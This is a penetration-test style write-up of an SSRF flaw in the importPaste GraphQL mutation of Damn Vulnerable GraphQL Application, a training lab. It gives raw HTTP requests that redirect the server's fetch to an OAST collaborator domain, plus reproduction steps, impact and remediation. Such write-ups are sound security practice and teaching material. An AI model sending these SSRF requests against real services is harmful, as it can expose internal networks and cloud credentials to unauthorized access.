# DVGA-006. Server-Side Request Forgery (SSRF) via importPaste GraphQL Mutation

## Severity

High

CVSS v3.1

Score: 7.5(High)

Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

## Overall CVSS Calculation

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
CVSS Base Score:	        7.5
Impact Subscore:	        3.6
Exploitability Subscore:	3.9
CVSS Temporal Score:	    NA
CVSS Environmental Score:	NA
Modified Impact Subscore:	NA
Overall CVSS Score:	      7.5

## CWE

CWE-918 - Server-Side Request Forgery (SSRF)

## OWASP Mapping

* OWASP Top 10 2021: A10. Server-Side Request Forgery (SSRF)
* OWASP API Security Top 10 2023: API7. Server Side Request Forgery

## Affected Endpoints

* `POST /graphql`
* GraphQL Mutation: `importPaste`

## Description

### Import Paste Functionality Testing with a hypothesis of SSRF

Pastebin link to use:

```text
https://pastebin.com/raw/m6GHCKJ2
```

First, let's see how the normal Import Paste functionality works.

### Backend Normal Request

```http
POST /graphql HTTP/2
Host: merlin-declivitous-crowdedly.ngrok-free.dev
Cookie: chat_session_id=ac1813ce-74a0-4f9f-a7b5-e4b9caafeb6a; abuse_interstitial=merlin-declivitous-crowdedly.ngrok-free.dev; env=graphiql:disable
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://merlin-declivitous-crowdedly.ngrok-free.dev/import_paste
Content-Type: application/json
Content-Length: 303
Origin: https://merlin-declivitous-crowdedly.ngrok-free.dev
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"query":"mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {
        importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {
          result
        }
      }","variables":{"host":"pastebin.com","port":443,"path":"/raw/m6GHCKJ2","scheme":"https"}}
```

### Response

```http
HTTP/2 200 OK
Content-Type: application/json
Date: Mon, 31 Aug 2026 15:44:32 GMT
Ngrok-Agent-Ips: X
Content-Length: 61

{"data":{"importPaste":{"result":"Damn Vulnerable GraphQL"}}}
```

Well, see the `host`, `port`, `path`, and `scheme` variable values?

The important thing here is that these values are being passed by the client to the `importPaste` mutation. The backend then uses them to fetch the requested resource.

So, let's change the `host` value and see whether the backend will make a request to a host controlled by us.

### Collaborator Link

```text
2hkk95d2i7f8k6pvy422fbardija70vp.oastify.com
```

### My Changed Request

I changed the `host` value from `pastebin.com` to my Collaborator/OAST domain while keeping the port, path and scheme valid.

```http
POST /graphql HTTP/2
Host: merlin-declivitous-crowdedly.ngrok-free.dev
Cookie: chat_session_id=ac1813ce-74a0-4f9f-a7b5-e4b9caafeb6a; abuse_interstitial=merlin-declivitous-crowdedly.ngrok-free.dev; env=graphiql:disable
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://merlin-declivitous-crowdedly.ngrok-free.dev/import_paste
Content-Type: application/json
Content-Length: 323
Origin: https://merlin-declivitous-crowdedly.ngrok-free.dev
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"query":"mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {
        importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {
          result
        }
      }","variables":{"host":"2hkk95d2i7f8k6pvy422fbardija70vp.oastify.com","port":443,"path":"/","scheme":"https"}}
```

### Response

```http
HTTP/2 200 OK
Content-Type: application/json
Date: Mon, 31 Aug 2026 15:47:13 GMT
Ngrok-Agent-Ips: X
Content-Length: 93

{"data":{"importPaste":{"result":"<html><body>akdwpxxptxqxz11wq51n8vzjkgigz</body></html>"}}
```

Here, the application returned the HTML content from my Collaborator/OAST server.

This confirms that the backend is actually making the request to the host supplied in the `host` variable instead of restricting the request to the intended Pastebin host.

So, SSRF is present in `/graphql`, and more specifically in the `importPaste` mutation.

## Steps to Reproduce

1. Go to the `/import_paste` functionality.
2. Observe the request sent to the GraphQL `/graphql` endpoint.
3. Identify the following user-controlled variables in the `importPaste` mutation:

```text
host
port
path
scheme
```

4. Send the normal request using:

```text
host: pastebin.com
port: 443
path: /raw/m6GHCKJ2
scheme: https
```

5. Confirm that the application fetches the Pastebin content and returns:

```text
Damn Vulnerable GraphQL
```

6. Now replace the `host` value with an attacker-controlled Collaborator/OAST domain:

```text
2hkk95d2i7f8k6pvy422fbardija70vp.oastify.com
```

7. Send the modified request.

8. The application makes the request to the attacker-controlled host and returns the response received from that server.

9. This confirms that the attacker can control where the backend makes the outbound request.

## Impact

An attacker can control the destination of a request made by the backend through the `importPaste` mutation.

Depending on the network access available to the application server, this could potentially be abused to:

* Make requests to attacker-controlled external servers.
* Access internal services that are not directly accessible from the Internet.
* Probe internal network resources.
* Potentially access cloud metadata services if they are reachable from the server.
* Use the application server to make requests on behalf of the attacker.

The current testing confirms the SSRF condition by making the backend connect to an attacker-controlled OAST server.

## Root Cause

The `importPaste` mutation accepts the destination through client-controlled parameters:

```text
host
port
path
scheme
```

There does not appear to be sufficient validation restricting the request to the intended Pastebin service.

Because the `host` value can be changed to an arbitrary domain, an attacker can redirect the server-side request to another destination.

## Remediation

* Restrict `importPaste` to trusted/allowlisted domains instead of allowing arbitrary hosts.
* Validate the `host`, `port`, `path`, and `scheme` values before making the request.
* Block requests to localhost, private IP addresses, link-local addresses, and other internal/reserved address ranges.
* Validate DNS resolution and make sure the resolved IP is not an internal or restricted address.
* Restrict outbound network access from the application server where possible.
* Only allow the protocols and ports that are actually required by the functionality.

## Evidence

```text
evidence/DVGA-006-SSRF-via-importPaste/
```